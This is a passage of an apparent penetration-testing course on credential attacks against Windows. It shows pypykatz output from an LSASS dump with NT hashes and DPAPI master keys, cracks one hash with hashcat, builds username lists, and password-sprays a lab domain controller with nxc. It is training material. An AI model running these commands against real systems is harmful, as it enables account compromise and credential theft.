	&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; Kerberos &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
		Username: bob
		Domain: DESKTOP-33E7O54
	&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; WDIGEST &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;14ab89]&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
		username bob
		domainname DESKTOP-33E7O54
		password None
		password &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;hex&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; DPAPI &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;14ab89]&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605

&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; LogonSession &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
authentication_id 1354581 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;14ab55&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354581
	&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; MSV &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; WDIGEST &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;14ab55]&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
		username bob
		domainname DESKTOP-33E7O54
		password None
		password &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;hex&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; Kerberos &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
		Username: bob
		Domain: DESKTOP-33E7O54
	&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; WDIGEST &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;14ab55]&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
		username bob
		domainname DESKTOP-33E7O54
		password None
		password &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;hex&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; LogonSession &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
authentication_id 1343859 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;148173&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2021-12-14T18:14:25.248681+00:00
sid S-1-5-90-0-2
luid 1343859
	&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; WDIGEST &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;148173]&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
		username WIN-6T0C3J2V6HP&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
		domainname WORKGROUP
		password None
		password &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;hex&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; WDIGEST &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;148173]&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
		username WIN-6T0C3J2V6HP&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
		domainname WORKGROUP
		password None
		password &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;hex&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Lets take a more detailed look at some of the useful information in the output.&lt;/p&gt;

&lt;h6 id=&quot;msv&quot;&gt;MSV&lt;/h6&gt;

&lt;p&gt;Attacking LSASS&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; MSV &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package&quot;&gt;MSV&lt;/a&gt; is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. Pypykatz extracted the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SID&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Username&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Domain&lt;/code&gt;, and even the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NT&lt;/code&gt; &amp;amp; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SHA1&lt;/code&gt; password hashes associated with the bob user account’s logon session stored in LSASS process memory. This will prove helpful in the final stage of our attack covered at the end of this section.&lt;/p&gt;

&lt;h6 id=&quot;wdigest&quot;&gt;WDIGEST&lt;/h6&gt;

&lt;p&gt;Attacking LSASS&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; WDIGEST &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;14ab89]&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
		username bob
		domainname DESKTOP-33E7O54
		password None
		password &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;hex&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WDIGEST&lt;/code&gt; is an older authentication protocol enabled by default in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Windows XP&lt;/code&gt; - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Windows 8&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Windows Server 2003&lt;/code&gt; - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Windows Server 2012&lt;/code&gt;. LSASS caches credentials used by WDIGEST in clear-text. This means if we find ourselves targeting a Windows system with WDIGEST enabled, we will most likely see a password in clear-text. Modern Windows operating systems have WDIGEST disabled by default. Additionally, it is essential to note that Microsoft released a security update for systems affected by this issue with WDIGEST. We can study the details of that security update &lt;a href=&quot;https://msrc-blog.microsoft.com/2014/06/05/an-overview-of-kb2871997/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h4 id=&quot;kerberos&quot;&gt;Kerberos&lt;/h4&gt;

&lt;p&gt;Attacking LSASS&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; Kerberos &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
		Username: bob
		Domain: DESKTOP-33E7O54
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;https://web.mit.edu/kerberos/#what_is&quot;&gt;Kerberos&lt;/a&gt; is a network authentication protocol used by Active Directory in Windows Domain environments. Domain user accounts are granted tickets upon authentication with Active Directory. This ticket is used to allow the user to access shared resources on the network that they have been granted access to without needing to type their credentials each time. LSASS &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;caches passwords&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ekeys&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tickets&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pins&lt;/code&gt; associated with Kerberos. It is possible to extract these from LSASS process memory and use them to access other systems joined to the same domain.&lt;/p&gt;

&lt;h4 id=&quot;dpapi&quot;&gt;DPAPI&lt;/h4&gt;

&lt;p&gt;Attacking LSASS&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; DPAPI &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;14ab89]&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The Data Protection Application Programming Interface or &lt;a href=&quot;https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection&quot;&gt;DPAPI&lt;/a&gt; is a set of APIs in Windows operating systems used to encrypt and decrypt DPAPI data blobs on a per-user basis for Windows OS features and various third-party applications. Here are just a few examples of applications that use DPAPI and what they use it for:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Applications&lt;/th&gt;
      &lt;th&gt;Use of DPAPI&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Internet Explorer&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Password form auto-completion data (username and password for saved sites).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Google Chrome&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Password form auto-completion data (username and password for saved sites).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Outlook&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Passwords for email accounts.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Remote Desktop Connection&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Saved credentials for connections to remote machines.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Credential Manager&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Mimikatz and Pypykatz can extract the DPAPI &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;masterkey&lt;/code&gt; for the logged-on user whose data is present in LSASS process memory. This masterkey can then be used to decrypt the secrets associated with each of the applications using DPAPI and result in the capturing of credentials for various accounts. DPAPI attack techniques are covered in greater detail in the &lt;a href=&quot;https://academy.hackthebox.com/module/details/67&quot;&gt;Windows Privilege Escalation&lt;/a&gt; module.&lt;/p&gt;

&lt;h6 id=&quot;cracking-the-nt-hash-with-hashcat&quot;&gt;Cracking the NT Hash with Hashcat&lt;/h6&gt;

&lt;p&gt;Now we can use Hashcat to crack the NT Hash. In this example, we only found one NT hash associated with the Bob user, which means we won’t need to create a list of hashes as we did in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Attacking SAM&lt;/code&gt; section of this module. After setting the mode in the command, we can paste the hash, specify a wordlist, and then crack the hash.&lt;/p&gt;

&lt;p&gt;Attacking LSASS&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;hashcat &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

64f12cddaa88057e06a81b54e73b949b:Password1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;attacking-active-directory--ntdsdit&quot;&gt;Attacking Active Directory &amp;amp; NTDS.dit&lt;/h1&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Active Directory&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AD&lt;/code&gt;) is a common and critical directory service in modern enterprise networks. AD is something we will repeatedly encounter, so we need to be familiar with various methods we can use to attack &amp;amp; defend these AD environments. It is safe to conclude that if the organization uses Windows, then AD is used to manage those Windows systems. Attacking AD is such an extensive &amp;amp; significant topic that we have multiple modules covering AD.&lt;/p&gt;

&lt;p&gt;In this section, we will focus primarily on how we can extract credentials through the use of a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dictionary attack against AD accounts&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dumping hashes&lt;/code&gt; from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NTDS.dit&lt;/code&gt; file.&lt;/p&gt;

&lt;p&gt;Like many of the attacks we have covered thus far, our target must be reachable over the network. This means it is highly likely that we will need to have a foothold established on the internal network to which the target is connected. That said, there are situations where an organization may be using port forwarding to forward the remote desktop protocol (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3389&lt;/code&gt;) or other protocols used for remote access on their &lt;a href=&quot;https://www.cisco.com/c/en/us/products/routers/what-is-an-edge-router.html&quot;&gt;edge router&lt;/a&gt; to a system on their internal network. Please know that most methods covered in this module simulate the steps after an initial compromise, and a foothold is established on an internal network. Before we get hands-on with the attack methods, let’s consider the authentication process once a Windows system has been joined to the domain. This approach will help us better understand the significance of Active Directory and the password attacks it can be susceptible to.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://academy.hackthebox.com/storage/modules/147/ADauthentication_diagram.png&quot; alt=&quot;Diagram showing Windows authentication process with lsass.exe, authentication packages, NTLM, Kerberos, and AD Directory Services.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once a Windows system is joined to a domain, it will &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;no longer default to referencing the SAM database to validate logon requests&lt;/code&gt;. That domain-joined system will now send all authentication requests to be validated by the domain controller before allowing a user to log on. This does not mean the SAM database can no longer be used. Someone looking to log on using a local account in the SAM database can still do so by specifying the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hostname&lt;/code&gt; of the device proceeded by the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Username&lt;/code&gt; (Example: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WS01/nameofuser&lt;/code&gt;) or with direct access to the device then typing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./&lt;/code&gt; at the logon UI in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Username&lt;/code&gt; field. This is worthy of consideration because we need to be mindful of what system components are impacted by the attacks we perform. It can also give us additional avenues of attack to consider when targeting Windows desktop operating systems or Windows server operating systems with direct physical access or over a network. Keep in mind that we can also study NTDS attacks by keeping track of this &lt;a href=&quot;https://attack.mitre.org/techniques/T1003/003/&quot;&gt;technique&lt;/a&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;dictionary-attacks-against-ad-accounts-using-crackmapexec&quot;&gt;Dictionary Attacks against AD accounts using CrackMapExec&lt;/h2&gt;

&lt;p&gt;Keep in mind that a dictionary attack is essentially using the power of a computer to guess a username &amp;amp;/or password using a customized list of potential usernames and passwords. It can be rather &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;noisy&lt;/code&gt; (easy to detect) to conduct these attacks over a network because they can generate a lot of network traffic and alerts on the target system as well as eventually get denied due to login attempt restrictions that may be applied through the use of &lt;a href=&quot;https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831791\(v=ws.11\)&quot;&gt;Group Policy&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;When we find ourselves in a scenario where a dictionary attack is a viable next step, we can benefit from trying to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;custom tailor&lt;/code&gt; our attack as much as possible. In this case, we can consider the organization we are working with to perform the engagement against and use searches on various social media websites and look for an employee directory on the company’s website. Doing this can result in us gaining the names of employees that work at the organization. One of the first things a new employee will get is a username. Many organizations follow a naming convention when creating employee usernames. Here are some common conventions to consider:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Username Convention&lt;/th&gt;
      &lt;th&gt;Practical Example for Jane Jill Doe&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;firstinitiallastname&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;jdoe&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;firstinitialmiddleinitiallastname&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;jjdoe&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;firstnamelastname&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;janedoe&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;firstname.lastname&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;jane.doe&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lastname.firstname&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;doe.jane&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nickname&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;doedoehacksstuff&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Often, an email address’s structure will give us the employee’s username (structure: username@domain). For example, from the email address &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jdoe&lt;/code&gt;@&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inlanefreight.com&lt;/code&gt;, we see that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jdoe&lt;/code&gt; is the username.&lt;/p&gt;

&lt;p&gt;A tip from MrB3n: We can often find the email structure by Googling the domain name, i.e., “@inlanefreight.com” and get some valid emails. From there, we can use a script to scrape various social media sites and mashup potential valid usernames. Some organizations try to obfuscate their usernames to prevent spraying, so they may alias their username like a907 (or something similar) back to joe.smith. That way, email messages can get through, but the actual internal username isn’t disclosed, making password spraying harder. Sometimes you can use google dorks to search for “inlanefreight.com filetype:pdf” and find some valid usernames in the PDF properties if they were generated using a graphics editor. From there, you may be able to discern the username structure and potentially write a small script to create many possible combinations and then spray to see if any come back valid.&lt;/p&gt;

&lt;h4 id=&quot;creating-a-custom-list-of-usernames&quot;&gt;Creating a Custom list of Usernames&lt;/h4&gt;

&lt;p&gt;Let’s say we have done our research and gathered a list of names based on publicly available information. We will keep the list relatively short for the sake of this lesson because organizations can have a huge number of employees. Example list of names:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Ben Williamson&lt;/li&gt;
  &lt;li&gt;Bob Burgerstien&lt;/li&gt;
  &lt;li&gt;Jim Stevenson&lt;/li&gt;
  &lt;li&gt;Jill Johnson&lt;/li&gt;
  &lt;li&gt;Jane Doe&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We can create a custom list on our attack host using the names above. We can use a command line-based text editor like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Vim&lt;/code&gt; or a graphical text editor to create our list. Our list may look something like this:&lt;/p&gt;

&lt;p&gt;Attacking Active Directory &amp;amp; NTDS.dit&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;usernames.txt 
bwilliamson
benwilliamson
ben.willamson
willamson.ben
bburgerstien
bobburgerstien
bob.burgerstien
burgerstien.bob
jstevenson
jimstevenson
jim.stevenson
stevenson.jim
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Of course, this is just an example and doesn’t include all of the names, but notice how we can include a different naming convention for each name if we do not already know the naming convention used by the target organization.&lt;/p&gt;

&lt;p&gt;We can manually create our list(s) or use an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;automated list generator&lt;/code&gt; such as the Ruby-based tool &lt;a href=&quot;https://github.com/urbanadventurer/username-anarchy&quot;&gt;Username Anarchy&lt;/a&gt; to convert a list of real names into common username formats. Once the tool has been cloned to our local attack host using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Git&lt;/code&gt;, we can run it against a list of real names as shown in the example output below:&lt;/p&gt;

&lt;p&gt;Attacking Active Directory &amp;amp; NTDS.dit&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./username-anarchy &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; /home/ltnbob/names.txt 

ben
benwilliamson
ben.williamson
benwilli
benwill
benw
b.williamson
bwilliamson
wben
w.ben
williamsonb
williamson
williamson.b
williamson.ben
bw
bob
bobburgerstien
bob.burgerstien
bobburge
bobburg
bobb
b.burgerstien
bburgerstien
bbob
b.bob
burgerstienb
burgerstien
burgerstien.b
burgerstien.bob
bb
jim
jimstevenson
jim.stevenson
jimsteve
jimstev
jims
j.stevenson
jstevenson
sjim
s.jim
stevensonj
stevenson
stevenson.j
stevenson.jim
js
jill
jilljohnson
jill.johnson
jilljohn
jillj
j.johnson
jjohnson
jjill
j.jill
johnsonj
johnson
johnson.j
johnson.jill
jj
jane
janedoe
jane.doe
janed
j.doe
jdoe
djane
d.jane
doej
doe
doe.j
doe.jane
jd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Using automated tools can save us time when crafting lists. Still, we will benefit from spending as much time as we can attempting to discover the naming convention an organization is using with usernames because this will reduce the need for us to guess the naming convention.&lt;/p&gt;

&lt;p&gt;It is ideal to limit the need to guess as much as possible when conducting password attacks.&lt;/p&gt;

&lt;h4 id=&quot;launching-the-attack-with-netexec&quot;&gt;Launching the Attack with NetExec&lt;/h4&gt;

&lt;p&gt;Once we have our list(s) prepared or discover the naming convention and some employee names, we can launch our attack against the target domain controller using a tool such as CrackMapExec. We can use it in conjunction with the SMB protocol to send logon requests to the target Domain Controller. Here is the command to do so:&lt;/p&gt;

&lt;p&gt;Attacking Active Directory &amp;amp; NTDS.dit&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nxc smb 10.129.201.57 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; bwilliamson &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; /usr/share/wordlists/fasttrack.txt

SMB         10.129.201.57     445    DC01           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:DC-PAC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:dac.local&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SMB         10.129.201.57     445    DC01             &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] inlanefrieght.local&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;williamson:winter2017 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] inlanefrieght.local&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;williamson:winter2016 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] inlanefrieght.local&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;williamson:winter2015 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] inlanefrieght.local&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;williamson:winter2014 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] inlanefrieght.local&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;williamson:winter2013 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] inlanefrieght.local&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;williamson:P@55w0rd STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] inlanefrieght.local&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;williamson:P@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] inlanefrieght.local&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;williamson:P@55w0rd! 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In this example, CrackMapExec is using SMB to attempt to logon as user (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-u&lt;/code&gt;) &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bwilliamson&lt;/code&gt; using a password (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p&lt;/code&gt;) list containing a list of commonly used passwords (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/wordlists/fasttrack.txt&lt;/code&gt;). If the admins configured an account lockout policy, this attack could lock out the account that we are targeting. At the time of this writing (January 2022), an account lockout policy is not enforced by default with the default group policies that apply to a Windows domain, meaning it is possible that we will come across environments vulnerable to this exact attack we are practicing.&lt;/p&gt;

&lt;h4 id=&quot;event-logs-from-the-attack&quot;&gt;Event Logs from the Attack&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;https://academy.hackthebox.com/storage/modules/147/events_dc.png&quot; alt=&quot;Windows Event Viewer showing security logs with Event ID 4776 for credential validation and event details.&quot; /&gt;&lt;/p&gt;

